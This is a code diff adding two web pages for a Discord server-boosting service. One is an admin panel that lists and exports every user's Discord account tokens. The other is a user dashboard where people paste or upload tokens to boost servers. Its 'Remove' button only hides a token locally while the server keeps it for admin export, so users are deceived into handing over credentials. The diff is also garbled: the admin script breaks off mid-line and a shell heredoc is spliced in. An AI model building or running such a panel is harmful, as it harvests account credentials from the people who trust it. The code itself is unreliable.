@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Panel - Discord Boost Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #0a0a1a;
+            color: #fff;
+            padding: 20px;
+        }
+        .container { max-width: 1600px; margin: auto; }
+        .header {
+            background: linear-gradient(135deg, #ed4245, #c03537);
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .header h1 { font-size: 2em; margin-bottom: 5px; }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+        .stat-card {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid #2a2a3e;
+            transition: transform 0.2s;
+        }
+        .stat-card:hover { transform: translateY(-2px); }
+        .stat-number {
+            font-size: 2.8em;
+            font-weight: bold;
+            color: #5865f2;
+        }
+        .stat-label {
+            color: #9494b8;
+            margin-top: 8px;
+            font-size: 14px;
+        }
+        .card {
+            background: #1a1a2e;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #2a2a3e;
+        }
+        .card h2 {
+            margin-bottom: 20px;
+            border-left: 4px solid #5865f2;
+            padding-left: 15px;
+            font-size: 1.4em;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            text-align: left;
+            padding: 14px 12px;
+            border-bottom: 1px solid #2a2a3e;
+        }
+        th {
+            color: #9494b8;
+            font-weight: 600;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        td { font-size: 14px; }
+        .valid { color: #57f287; font-weight: bold; }
+        .invalid { color: #ed4245; }
+        .nitro { color: #faa81a; font-weight: bold; }
+        input, select, button {
+            padding: 10px 16px;
+            margin: 5px;
+            border-radius: 8px;
+            border: none;
+            font-size: 14px;
+        }
+        input, select {
+            background: #2a2a3e;
+            color: white;
+            border: 1px solid #3a3a4e;
+        }
+        input:focus, select:focus { outline: none; border-color: #5865f2; }
+        button {
+            background: #5865f2;
+            color: white;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        button:hover { background: #4752c4; transform: scale(1.02); }
+        button.danger { background: #ed4245; }
+        button.danger:hover { background: #c03537; }
+        button.success { background: #23a55a; }
+        button.success:hover { background: #1e8545; }
+        .search-box {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .search-box input { flex: 1; min-width: 200px; }
+        .user-row {
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .user-row:hover { background: #2a2a3e; }
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+        .badge-nitro { background: #faa81a20; color: #faa81a; }
+        .badge-valid { background: #57f28720; color: #57f287; }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: #1a1a2e;
+            border-radius: 15px;
+            padding: 25px;
+            max-width: 900px;
+            width: 90%;
+            max-height: 85%;
+            overflow-y: auto;
+        }
+        .close {
+            float: right;
+            cursor: pointer;
+            font-size: 28px;
+            color: #9494b8;
+            transition: color 0.2s;
+        }
+        .close:hover { color: #fff; }
+        .token-item {
+            background: #0a0a1a;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            border: 1px solid #2a2a3e;
+        }
+        .token-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .token-status { font-size: 11px; padding: 2px 8px; border-radius: 10px; }
+        .token-status.valid { background: #57f28720; }
+        .token-status.invalid { background: #ed424520; }
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #9494b8;
+        }
+        @media (max-width: 768px) {
+            th, td { padding: 8px; font-size: 12px; }
+            .stat-number { font-size: 2em; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Login Screen -->
+    <div id="loginScreen" class="card" style="max-width: 400px; margin: 100px auto; text-align: center;">
+        <h2 style="margin-bottom: 20px;">🔐 Admin Login</h2>
+        <input type="password" id="adminPassword" placeholder="Enter admin secret" style="width: 100%; margin-bottom: 15px;">
+        <button onclick="login()" style="width: 100%;">Login</button>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div id="adminDashboard" style="display: none;">
+        <div class="header">
+            <h1>🔐 Admin Control Panel</h1>
+            <p>Manage all users, tokens, and boost activity</p>
+        </div>
+
+        <div class="stats-grid" id="statsGrid"></div>
+
+        <div class="card">
+            <h2>👥 All Users</h2>
+            <div class="search-box">
+                <input type="text" id="userSearch" placeholder="Search by username..." onkeyup="filterUsers()">
+                <button onclick="refreshData()">🔄 Refresh</button>
+                <button onclick="exportAllData()" class="success">📥 Export All Tokens</button>
+            </div>
+            <div style="overflow-x: auto;">
+                <table id="usersTable">
+                    <thead>
+                        <tr>
+                            <th>Username</th>
+                            <th>Tokens</th>
+                            <th>Valid</th>
+                            <th>Invalid</th>
+                            <th>Nitro</th>
+                            <th>Total Boosts</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="usersTableBody">
+                        <tr><td colspan="7" class="loading">Loading users...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- User Details Modal -->
+<div id="userModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <h2 id="modalTitle">User Tokens</h2>
+        <div id="modalBody" style="margin-top: 20px;"></div>
+        <div class="action-buttons">
+            <button onclick="exportUserTokens()" class="success">📥 Export This User's Tokens</button>
+            <button onclick="deleteAllUserTokens()" class="danger">🗑️ Delete All User's Tokens</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    let adminSecret = '';
+    let allUsers = [];
+    let currentUser = '';
+    let currentUserTokens = [];
+
+    async function login() {
+        const password = document.getElementById('adminPassword').value;
+        if (!password) {
+            alert('Enter admin secret');
+            return;
+        }
+        
+        try {
+            const res = await fetch(`/api/admin/verify?secret=${encodeURIComponent(password)}`);
+            const data = await res.json();
+            
+            if (data.authorized) {
+                adminSecret = password;
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('adminDashboard').style.display = 'block';
+                refreshData();
+            } else {
+                alert('Invalid admin secret');
+            }
+        } catch (err) {
+            alert('Error connecting to server');
+        }
+    }
+
+    async function refreshData() {
+        try {
+            const res = await fetch(`/api/admin/all_data?secret=${encodeURIComponent(adminSecret)}`);
+            const data = await res.json();
+            
+            if (data.error) {
+                alert(data.error);
+                return;
+            }
+            
+            allUsers = data.users || [];
+            updateStats(data);
+            renderUsersTable();
+        } catch (err) {
+            console.error(err);
+            alert('Error loading data');
+        }
+    }
+
+    function updateStats(data) {
+        const statsGrid = document.getElementById('statsGrid');
+        statsGrid.innerHTML = `
+            <div class="stat-card">
+                <div class="stat-number">${data.total_users || 0}</div>
+                <div class="stat-label">Total Users</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">${data.total_tokens || 0}</div>
+                <div class="stat-label">Total Tokens</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">${allUsers.reduce((sum, u) => sum + (u.valid_count || 0), 0)}</div>
+                <div class="stat-label">Valid Tokens</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">${allUsers.reduce((sum, u) => sum + (u.nitro_count || 0), 0)}</div>
+                <div class="stat-label">Nitro Tokens</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">${allUsers.reduce((sum, u) => sum + (u.total_boosts || 0), 0)}</div>
+                <div class="stat-label">Total Boosts Available</div>
+            </div>
+        `;
+    }
+
+    function renderUsersTable() {
+        const tbody = document.getElementById('usersTableBody');
+        const searchTerm = document.getElementById('userSearch')?.value.toLowerCase() || '';
+        
+        const filteredUsers = allUsers.filter(u => u.username.toLowerCase().includes(searchTerm));
+        
+        if (filteredUsers.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="7" class="loading">No users found</td></tr>';
+            return;
+        }
+        
+        tbody.innerHTML = filteredUsers.map(user => `
+            <tr class="user-row" onclick="showUserTokens('${escapeHtml(user.username)}')">
+                <td><strong>${escapeHtml(user.username)}</strong></td>
+                <td>${user.tokens?.length || 0}</td>
+                <td><span class="valid">${user.valid_count || 0}</span></td>
+                <td><span class="invalid">${user.invalid_count || 0}</span></td>
+                <td><span class="nitro">${user.nitro_count || 0}</span></td>
+                <td>${user.total_boosts || 0}</td>
+                <td>
+                    <button class="danger" onclick="event.stopPropagation(); deleteUser('${escapeHtml(user.username)}')">Delete User</button>
+                </td>
+            </tr>
+        `).join('');
+    }
+
+    function filterUsers() {
+        renderUsersTable();
+    }
+
+    async function showUserTokens(username) {
+        currentUser = username;
+        document.getElementById('modalTitle').innerText = `Tokens for: ${username}`;
+        document.getElementById('modalBody').innerHTML = '<div class="loading">Loading tokens...</div>';
+        document.getElementById('userModal').style.display = 'flex';
+        
+        try {
+            const res = await fetch(`/api/admin/user_tokens?secret=${encodeURIComponent(adminSecret)}&username=${encodeURIComponent(username)}`);
+            const data = await res.json();
+            
+            if (data
+
+
+
+
+cd ~/discord_booster/templates
+cat > dashboard.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Boost Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0a1a; color: #fff; padding: 20px; }
+        .container { max-width: 1200px; margin: auto; }
+        .header { background: linear-gradient(135deg, #5865f2, #4752c4); padding: 20px; border-radius: 15px; margin-bottom: 20px; text-align: center; }
+        .user-badge { background: rgba(0,0,0,0.3); border-radius: 20px; padding: 5px 15px; display: inline-block; margin-top: 10px; }
+        .card { background: #1a1a2e; border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a2a3e; }
+        .card h2 { margin-bottom: 15px; border-left: 4px solid #5865f2; padding-left: 12px; }
+        input, button { padding: 12px 16px; margin: 5px; border-radius: 8px; border: none; font-size: 14px; }
+        input { background: #2a2a3e; color: white; border: 1px solid #3a3a4e; flex: 1; }
+        button { background: #5865f2; color: white; cursor: pointer; font-weight: bold; }
+        button:hover { background: #4752c4; }
+        .danger { background: #ed4245; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .stat { background: #1a1a2e; border-radius: 10px; padding: 15px; text-align: center; }
+        .stat-num { font-size: 2em; font-weight: bold; color: #5865f2; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #2a2a3e; }
+        .valid { color: #57f287; }
+        .nitro { color: #faa81a; }
+        @media (max-width: 768px) { th, td { padding: 8px; font-size: 12px; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🎮 Discord Boost Dashboard</h1>
+        <div class="user-badge">User: <strong id="username"></strong></div>
+    </div>
+
+    <div class="stats">
+        <div class="stat"><div class="stat-num" id="totalTokens">0</div><div>Total Tokens</div></div>
+        <div class="stat"><div class="stat-num" id="validTokens">0</div><div>Valid</div></div>
+        <div class="stat"><div class="stat-num" id="totalBoosts">0</div><div>Boosts</div></div>
+    </div>
+
+    <div class="card">
+        <h2>📦 Your Tokens</h2>
+        <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px;">
+            <input type="text" id="tokenInput" placeholder="Paste Discord token" style="flex: 2;">
+            <button onclick="addToken()">Add Token</button>
+            <button onclick="importFile()" style="background:#23a55a;">Import File</button>
+        </div>
+        <div style="overflow-x: auto;">
+            <table id="tokenTable">
+                <thead><tr><th>Token</th><th>Username</th><th>Nitro</th><th>Boosts</th><th></th></tr></thead>
+                <tbody></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>🚀 Boost a Server</h2>
+        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <input type="text" id="inviteInput" placeholder="discord.gg/xxx" style="flex: 2;">
+            <input type="number" id="boostAmount" placeholder="Boosts" value="1" style="width: 120px;">
+            <button onclick="startBoost()">Start Boosting</button>
+        </div>
+        <div id="boostResult" style="margin-top: 15px; padding: 12px; background: #0a0a1a; border-radius: 8px; display: none;"></div>
+    </div>
+</div>
+
+<script>
+    const userId = new URLSearchParams(location.search).get('user') || 'default';
+    document.getElementById('username').innerText = userId;
+    
+    let hiddenTokens = new Set(JSON.parse(localStorage.getItem(`hidden_${userId}`) || '[]'));
+
+    async function loadTokens() {
+        const res = await fetch(`/api/tokens?user=${userId}`);
+        const data = await res.json();
+        const visible = data.filter(t => !hiddenTokens.has(t.full_token));
+        
+        document.getElementById('totalTokens').innerText = visible.length;
+        document.getElementById('validTokens').innerText = visible.filter(t => t.valid).length;
+        document.getElementById('totalBoosts').innerText = visible.reduce((s, t) => s + (t.boosts || 0), 0);
+        
+        const tbody = document.querySelector('#tokenTable tbody');
+        tbody.innerHTML = '';
+        visible.forEach(t => {
+            const row = tbody.insertRow();
+            row.insertCell(0).innerHTML = `<code style="font-size:11px;">${t.token}</code>`;
+            row.insertCell(1).innerHTML = t.username || '?';
+            row.insertCell(2).innerHTML = t.nitro !== "No Nitro" ? `<span class="nitro">${t.nitro}</span>` : 'None';
+            row.insertCell(3).innerHTML = t.valid ? `<span class="valid">${t.boosts}</span>` : '❌';
+            row.insertCell(4).innerHTML = `<button class="danger" onclick="removeToken('${t.full_token.replace(/'/g, "\\'")}')">Remove</button>`;
+        });
+    }
+
+    async function addToken() {
+        const token = document.getElementById('tokenInput').value.trim();
+        if (!token) return alert('Enter a token');
+        
+        const res = await fetch('/api/tokens/add', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user: userId, token: token })
+        });
+        const data = await res.json();
+        
+        if (data.status === 'ok') {
+            document.getElementById('tokenInput').value = '';
+            loadTokens();
+            alert(`✅ Token added for ${data.username}`);
+        } else if (data.status === 'invalid') {
+            alert('❌ Invalid token!');
+        } else if (data.status === 'exists') {
+            alert('Token already exists');
+        }
+    }
+
+    function removeToken(fullToken) {
+        if (!confirm('Remove this token from your view?')) return;
+        hiddenTokens.add(fullToken);
+        localStorage.setItem(`hidden_${userId}`, JSON.stringify([...hiddenTokens]));
+        loadTokens();
+    }
+
+    function importFile() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = '.txt,.json';
+        input.onchange = async (e) => {
+            const file = e.target.files[0];
+            const formData = new FormData();
+            formData.append('user', userId);
+            formData.append('file', file);
+            
+            const res = await fetch('/api/upload', { method: 'POST', body: formData });
+            const data = await res.json();
+            
+            if (data.status === 'ok') {
+                alert(`✅ Added ${data.tokens_added} tokens (${data.tokens_failed || 0} failed)`);
+                loadTokens();
+            } else {
+                alert('Error: ' + (data.message || 'Unknown'));
+            }
+        };
+        input.click();
+    }
+
+    async function startBoost() {
+        const invite = document.getElementById('inviteInput').value.trim();
+        const amount = document.getElementById('boostAmount').value;
+        
+        if (!invite) return alert('Enter server invite');
+        
+        const resultDiv = document.getElementById('boostResult');
+        resultDiv.style.display = 'block';
+        resultDiv.innerHTML = '<p>⏳ Starting boost process...</p>';
+        
+        const res = await fetch('/api/boost/start', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user: userId, invite: invite, target_boosts: parseInt(amount) })
+        });
+        const data = await res.json();
+        
+        if (data.error) {
+            resultDiv.innerHTML = `<p style="color:#ed4245;">❌ ${data.error}</p>`;
+        } else {
+            resultDiv.innerHTML = `<p style="color:#57f287;">✅ ${data.message}<br>Total boosts available: ${data.total_boosts_available}</p>`;
+        }
+    }
+
+    loadTokens();
+    setInterval(loadTokens, 30000);
+</script>
+</body>
+</html>
